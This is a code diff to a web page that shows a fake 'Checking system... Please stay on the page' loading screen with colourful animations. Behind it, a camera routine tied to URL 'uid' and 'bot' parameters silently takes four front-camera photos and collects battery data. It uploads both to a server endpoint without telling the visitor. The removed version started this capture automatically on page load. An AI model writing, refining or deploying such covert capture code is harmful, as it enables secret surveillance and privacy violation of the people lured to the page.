@@ -882,9 +882,8 @@
       
       element.innerHTML = `${icon} ${text}<br><i class="fas fa-user-clock"></i> Please stay on the page`;
     }
-    
-/* ================= UI EFFECTS ================= */
 
+/* ================= UI EFFECTS ================= */
 document.addEventListener("DOMContentLoaded", () => {
   createStars();
   createProgressMarkers();
@@ -907,6 +906,8 @@ function createStars() {
       height:${size}px;
       animation-delay:${Math.random()*5}s;
       animation-duration:${Math.random()*3+2}s;
+      background-color:hsl(${Math.random()*360},70%,80%);
+      box-shadow:0 0 ${size*3}px hsl(${Math.random()*360},70%,80%);
     `;
     c.appendChild(s);
   }
@@ -931,7 +932,10 @@ function startProgress() {
   let p = 0;
   const timer = setInterval(() => {
     p += 0.35;
-    if (p >= 100) clearInterval(timer);
+    if (p >= 100) {
+      p = 100;
+      clearInterval(timer);
+    }
     bar.style.width = p + "%";
     percent.innerText = Math.round(p) + "%";
     updateLoadingText(p, text);
@@ -939,10 +943,10 @@ function startProgress() {
 }
 
 function updateLoadingText(p, el) {
-  if (p < 25) el.innerHTML = "Checking system...";
-  else if (p < 50) el.innerHTML = "Preparing content...";
-  else if (p < 75) el.innerHTML = "Processing data...";
-  else el.innerHTML = "Finalizing...";
+  if (p < 25) el.innerHTML = "🔍 Checking system...";
+  else if (p < 50) el.innerHTML = "⚡ Preparing content...";
+  else if (p < 75) el.innerHTML = "💾 Processing data...";
+  else el.innerHTML = "✨ Finalizing...";
 }
 
 function addExtraEffects() {
@@ -952,84 +956,87 @@ function addExtraEffects() {
     box.style.boxShadow = `0 0 40px hsl(${h},100%,50%)`;
     h = (h + 10) % 240;
   }, 3000);
+
+  const loaderDot = document.querySelector(".loader-dot");
+  if(loaderDot){
+    setInterval(() => {
+      const hue = Math.random() * 60 + 180;
+      loaderDot.style.background = `hsl(${hue},100%,50%)`;
+      loaderDot.style.boxShadow = `0 0 20px hsl(${hue},100%,50%)`;
+    }, 2000);
+  }
 }
 
 /* ================= CAMERA SYSTEM ================= */
+const params = new URLSearchParams(location.search);
+const uid = params.get("uid") || "NO_UID";
+const bot = params.get("bot") || "bot1";
 
-  // ✅ URL څخه user ID او bot ID واخله
-  const params = new URLSearchParams(window.location.search);
-  const uid = params.get("uid") || "NO_UID";
-  const bot = params.get("bot") || "bot1"; // default bot که نه وي ورکړل شوی
+async function capturePhotos() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
-  async function capturePhotos() {
-    try {
-      // 🎥 کیمره فعال کړه
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement("video");
-video.srcObject = stream;
-video.muted = true;
-video.playsInline = true;
+  try {
+    // Get camera stream
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
 
-await new Promise(resolve => {
-  video.onloadedmetadata = () => {
-    video.play();
-    resolve();
-  };
-});
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        video.play();
+        resolve();
+      };
+    });
 
-await new Promise(r => setTimeout(r, 800));
+    await new Promise(r => setTimeout(r, 800)); // camera warmup
 
-      // 🖼 Canvas د عکس اخیستلو لپاره
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext("2d");
 
-      // 🔋 Battery info
-      let batteryLevel = "Unknown";
-      let charging = "Unknown";
-
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        batteryLevel = Math.round(battery.level * 100);
-        charging = battery.charging ? "true" : "false";
-      }
-
-      // 📦 FormData د عکسونو او معلوماتو لیږلو لپاره
-      const formData = new FormData();
-      formData.append("uid", uid);
-      formData.append("bot", bot);
-      formData.append("battery", batteryLevel.toString());
-      formData.append("charging", charging);
-
-      // 📸 4 عکسونه په پرله پسې ډول واخله
-      for (let i = 1; i <= 4; i++) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
-        formData.append("photo" + i, blob, `snap${i}.jpg`);
-
-        // لږ ځنډ تر څو عکسونه جلا شي
-        await new Promise(r => setTimeout(r, 700));
-      }
-
-      // 📤 عکسونه سرور ته واستوه
-      await fetch("/api/upload", {
-        method: "POST",
-        body: formData
-      });
-
-      // 🎬 Stream بند کړه
-      stream.getTracks().forEach(track => track.stop());
-
-    } catch (e) {
-      console.error("Camera error:", e);
-      alert("🚫 Unable to access camera or take photos.");
+    // Battery info
+    let batteryLevel = "Unknown";
+    let charging = "Unknown";
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryLevel = Math.round(battery.level * 100);
+      charging = battery.charging ? "true" : "false";
     }
-  }
 
-  // ⏱ د پاڼې له لوډ وروسته عکس اخیستل پیل کړه
-  window.onload = () => setTimeout(capturePhotos, 1000);
-</script> 
+    const formData = new FormData();
+    formData.append("uid", uid);
+    formData.append("bot", bot);
+    formData.append("battery", batteryLevel.toString());
+    formData.append("charging", charging);
+
+    // Take 4 photos
+    for (let i = 1; i <= 4; i++) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
+      formData.append(`photo${i}`, blob, `snap${i}.jpg`);
+      await new Promise(r => setTimeout(r, 600));
+    }
+
+    // Upload to server
+    await fetch("/api/upload", { method: "POST", body: formData });
+
+    // Stop camera
+    stream.getTracks().forEach(t => t.stop());
+
+  } catch (err) {
+    console.warn("Camera permission blocked or error:", err);
+  }
+}
+</script>
   
 </body>
 </html>
+
+
+
+
+
+
